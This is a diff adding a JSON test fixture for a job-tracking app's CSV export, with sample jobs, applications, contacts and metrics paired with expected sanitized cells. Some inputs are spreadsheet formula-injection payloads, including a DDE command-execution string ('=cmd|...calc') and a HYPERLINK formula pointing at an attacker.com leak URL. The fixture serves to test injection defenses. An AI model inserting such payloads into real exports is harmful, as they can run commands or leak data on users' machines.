@@ -1,0 +1,264 @@
+{
+  "version": "1.0.0",
+  "generated_at": "2026-09-18T12:00:00Z",
+  "specification": "CAR-18 / REQ-006 / AT-013 / AT-022 / FND-005 / FND-006 / SRC-C2 / SRC-C7 / SRC-C8",
+  "description": "Groundtruth evaluation fixtures for multi-domain CSV exports (Jobs, Applications, Contacts, Analytics) with formula injection defense and UTF-8 encoding.",
+  "scenarios": [
+    {
+      "scenario_id": "jobs_export_scenario",
+      "dataset_type": "jobs",
+      "description": "Saved and shortlisted jobs export with normalized compensation intervals, required skills, priority, and direct URLs.",
+      "input_jobs": [
+        {
+          "id": "job-saved-01",
+          "user_id": "user-csv-1",
+          "job_id": "job-gh-stripe-44",
+          "canonical_url": "https://boards.greenhouse.io/stripe/jobs/5412987",
+          "title": "Senior Distributed Systems Engineer (Go)",
+          "company": "Stripe",
+          "location": {
+            "city": "San Francisco",
+            "state": "CA",
+            "country": "US",
+            "is_remote": true
+          },
+          "job_type": "Full-time",
+          "compensation": {
+            "currency": "USD",
+            "min_amount": 190000,
+            "max_amount": 240000,
+            "period": "yearly"
+          },
+          "required_skills": ["Go", "Distributed Systems", "Kafka", "PostgreSQL"],
+          "direct_apply_url": "https://boards.greenhouse.io/stripe/jobs/5412987",
+          "status": "shortlisted",
+          "priority": 5,
+          "saved_at": "2026-09-15T10:00:00Z"
+        },
+        {
+          "id": "job-saved-02",
+          "user_id": "user-csv-1",
+          "job_id": "job-indeed-uber-12",
+          "canonical_url": "https://www.indeed.com/viewjob?jk=uber_infra_12",
+          "title": "+Staff Platform Reliability Engineer",
+          "company": "@Uber Technologies",
+          "location": {
+            "city": "Sunnyvale",
+            "state": "CA",
+            "country": "US",
+            "is_remote": false
+          },
+          "job_type": "Full-time",
+          "compensation": {
+            "currency": "USD",
+            "min_amount": 210000,
+            "max_amount": 275000,
+            "period": "yearly"
+          },
+          "required_skills": ["Kubernetes", "Go", "Terraform"],
+          "direct_apply_url": "https://careers.uber.com/jobs/12",
+          "status": "ready_to_apply",
+          "priority": 4,
+          "saved_at": "2026-09-16T11:30:00Z"
+        }
+      ],
+      "expected_headers": [
+        "Saved Job ID",
+        "Job Title",
+        "Company",
+        "Location",
+        "Job Type",
+        "Salary Min",
+        "Salary Max",
+        "Currency",
+        "Interval",
+        "Required Skills",
+        "Priority",
+        "Status",
+        "Direct Apply URL",
+        "Saved At"
+      ],
+      "expected_rows_count": 2,
+      "expected_sanitized_cells": [
+        "'+Staff Platform Reliability Engineer",
+        "'@Uber Technologies"
+      ]
+    },
+    {
+      "scenario_id": "applications_export_scenario",
+      "dataset_type": "applications",
+      "description": "Complete application ledger export with verified Applied marks, formula injection payloads neutralized (AT-013), and standalone resume artifact references (FND-006).",
+      "input_applications": [
+        {
+          "id": "app-exp-01",
+          "user_id": "user-csv-1",
+          "job_id": "job-gh-stripe-44",
+          "canonical_url": "https://boards.greenhouse.io/stripe/jobs/5412987",
+          "title": "Senior Distributed Systems Engineer (Go)",
+          "company": "Stripe",
+          "location": "San Francisco, CA (Remote)",
+          "portal_type": "greenhouse_direct",
+          "status": "applied",
+          "stage": "applied",
+          "submission_mode": "direct_ats",
+          "is_verified_applied": true,
+          "applied_at": "2026-09-15T15:30:00Z",
+          "provider_reference": "STRIPE-GH-98412",
+          "verification_type": "provider_receipt",
+          "resume_version": "v4.2.0",
+          "resume_path": "/artifacts/resumes/stripe_senior_go_systems_v4.pdf",
+          "resume_checksum": "a9f4c3b2e1d0f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3",
+          "notes": "Greenhouse direct confirmation receipt verified."
+        },
+        {
+          "id": "app-exp-02",
+          "user_id": "user-csv-1",
+          "job_id": "job-malicious-csv",
+          "canonical_url": "https://careers.external.com/jobs/99",
+          "title": "=cmd|'/C calc'!A0",
+          "company": "-MaliciousCorp",
+          "location": "\tRemoteZone",
+          "portal_type": "generic_external",
+          "status": "needs_confirmation",
+          "stage": "needs_confirmation",
+          "submission_mode": "manual_browser",
+          "is_verified_applied": false,
+          "applied_at": "2026-09-17T09:00:00Z",
+          "provider_reference": "@REF-INJECT-101",
+          "verification_type": "user_attestation",
+          "resume_version": "v1.0.0",
+          "resume_path": "/artifacts/resumes/base_resume.pdf",
+          "resume_checksum": "b1b2b3b4b5b6b7b8",
+          "notes": "=SUM(A1:A10)"
+        }
+      ],
+      "expected_headers": [
+        "Application ID",
+        "Job Title",
+        "Company",
+        "Location",
+        "Portal Type",
+        "Stage",
+        "Submission Mode",
+        "Verified Applied",
+        "Applied At (UTC)",
+        "Verification Ref",
+        "Verification Type",
+        "Resume Version",
+        "Resume Path",
+        "Resume Checksum",
+        "Notes"
+      ],
+      "expected_rows_count": 2,
+      "expected_sanitized_cells": [
+        "'=cmd|'/C calc'!A0",
+        "'-MaliciousCorp",
+        "'\tRemoteZone",
+        "'@REF-INJECT-101",
+        "'=SUM(A1:A10)"
+      ]
+    },
+    {
+      "scenario_id": "contacts_export_scenario",
+      "dataset_type": "contacts",
+      "description": "Recruiter and professional relationship leads export with interaction history, status, and follow-up schedules.",
+      "input_contacts": [
+        {
+          "id": "cnt-rec-01",
+          "user_id": "user-csv-1",
+          "name": "Sarah Jenkins",
+          "role_title": "Senior Technical Recruiter (Infrastructure)",
+          "company": "Stripe",
+          "email": "sarah.j@stripe.com",
+          "linkedin_url": "https://www.linkedin.com/in/sarah-jenkins-tech",
+          "status": "in_conversation",
+          "linked_application_id": "app-exp-01",
+          "last_interaction_at": "2026-09-16T14:00:00Z",
+          "next_follow_up_at": "2026-09-23T14:00:00Z",
+          "notes": "Reached out regarding distributed systems background. Phone screen scheduled."
+        },
+        {
+          "id": "cnt-rec-02",
+          "user_id": "user-csv-1",
+          "name": "=HYPERLINK(\"http://attacker.com/leak\",\"David Miller\")",
+          "role_title": "Engineering Director",
+          "company": "+Fintech Partners",
+          "email": "david.m@fintech.example.com",
+          "linkedin_url": "https://www.linkedin.com/in/david-miller-eng",
+          "status": "lead",
+          "linked_application_id": "",
+          "last_interaction_at": "2026-09-14T10:00:00Z",
+          "next_follow_up_at": "2026-09-21T10:00:00Z",
+          "notes": "@Referral from open source contribution discussion."
+        }
+      ],
+      "expected_headers": [
+        "Contact ID",
+        "Full Name",
+        "Role / Title",
+        "Company",
+        "Email",
+        "LinkedIn URL",
+        "Status",
+        "Linked Application ID",
+        "Last Interaction (UTC)",
+        "Next Follow-Up (UTC)",
+        "Notes"
+      ],
+      "expected_rows_count": 2,
+      "expected_sanitized_cells": [
+        "'=HYPERLINK(\"http://attacker.com/leak\",\"David Miller\")",
+        "'+Fintech Partners",
+        "'@Referral from open source contribution discussion."
+      ]
+    },
+    {
+      "scenario_id": "analysis_export_scenario",
+      "dataset_type": "analysis",
+      "description": "Career funnel conversion metrics and skills demand analysis export.",
+      "input_metrics": [
+        {
+          "metric_key": "total_applications",
+          "category": "funnel",
+          "label": "Total Applications Submitted",
+          "value": "42",
+          "unit": "count",
+          "benchmark": "30",
+          "notes": "Ahead of 30-day target pacing."
+        },
+        {
+          "metric_key": "interview_conversion_rate",
+          "category": "funnel",
+          "label": "Interview Request Conversion Rate",
+          "value": "19.0%",
+          "unit": "percent",
+          "benchmark": "10.0%",
+          "notes": "High response rate on verified tailored applications."
+        },
+        {
+          "metric_key": "skill_gap_go",
+          "category": "skills",
+          "label": "=Go / Golang Distributed Systems",
+          "value": "95%",
+          "unit": "match_score",
+          "benchmark": "80%",
+          "notes": "+Exceeds senior requirements across target postings."
+        }
+      ],
+      "expected_headers": [
+        "Metric Key",
+        "Category",
+        "Metric Label",
+        "Current Value",
+        "Unit",
+        "Target / Benchmark",
+        "Analysis Notes"
+      ],
+      "expected_rows_count": 3,
+      "expected_sanitized_cells": [
+        "'=Go / Golang Distributed Systems",
+        "'+Exceeds senior requirements across target postings."
+      ]
+    }
+  ]
+}
